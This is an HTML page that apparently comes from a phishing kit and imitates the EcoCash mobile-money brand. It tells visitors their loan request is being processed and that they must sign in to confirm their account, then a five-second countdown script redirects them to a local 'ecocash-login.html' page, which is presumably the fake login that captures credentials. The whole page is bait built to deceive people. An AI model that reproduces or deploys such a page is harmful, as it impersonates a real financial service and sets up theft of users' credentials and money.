<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Confirm EcoCash Account</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
    body { background: #ffffff; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
    .container { width: min(92%, 420px); background: white; border-radius: 20px; overflow: hidden; position: relative; box-shadow: 0 8px 25px rgba(0,0,0,0.1); padding: 40px 30px 180px; text-align: center; }
    .logo { text-align: center; font-size: 42px; font-weight: bold; margin-bottom: 25px; }
    .logo span:first-child { color: #0b5ea6; }
    .logo span:last-child { color: #e41e2b; }
    h1 { font-size: 24px; margin-bottom: 12px; color: #666; }
    p { color: #475569; line-height: 1.6; margin-bottom: 18px; }
    .btn-group { display: grid; gap: 10px; margin-top: 16px; }
    .btn { padding: 12px 14px; border-radius: 10px; border: 1px solid transparent; font-weight: 700; cursor: pointer; font-size: 0.95rem; transition: all 0.3s ease; }
    .btn-primary { background: #0b5ea6; color: #fff; border-color: #0b5ea6; }
    .btn-primary:hover { background: #094d8a; }
    .btn-secondary { background: #e2e8f0; color: #0f172a; border-color: #cbd5e1; }
    .btn-secondary:hover { background: #cbd5e1; }
    .loader { width: 16px; height: 16px; border: 2px solid #fff; border-top: 2px solid rgba(255,255,255,0.65); border-radius: 50%; animation: spin 0.7s linear infinite; margin-left: 8px; display: inline-block; vertical-align: middle; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .info { font-size: 0.85rem; color: #64748b; margin-top: 8px; }
    .bottom-section { position: relative; margin-top: 20px; width: 100%; min-height: 88px; background: #0b5ea6; border-top-left-radius: 24px; border-top-right-radius: 24px; padding: 16px 20px; color: white; text-align: center; }
    .version { font-size: 13px; opacity: 0.9; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <span>Eco</span><span>Cash</span>
    </div>
    <h1>Confirm Your EcoCash Account</h1>
    <p>Your loan request has been received.<br/>To complete processing and enable disbursement, please confirm your EcoCash account by signing in.</p>
    <div class="btn-group">
      <button class="btn btn-primary" id="goNowBtn">Confirm EcoCash Account Now</button>
    </div>
    <div class="info">You will be redirected to EcoCash login in <span id="sec">5</span> seconds.</div>
    <div class="bottom-section">
      <div class="version">v4.0.1P</div>
    </div>
  </div>
  <script>
    const goNowBtn = document.getElementById('goNowBtn');
    const secEl = document.getElementById('sec');
    let countdown = 5;
    let timer;

    function gotoLogin() {
      window.location.href = 'ecocash-login.html';
    }

    goNowBtn.addEventListener('click', gotoLogin);

    timer = setInterval(() => {
      countdown -= 1;
      secEl.textContent = countdown;
      if (countdown <= 0) {
        clearInterval(timer);
        gotoLogin();
      }
    }, 1000);
  </script>
</body>

</html>
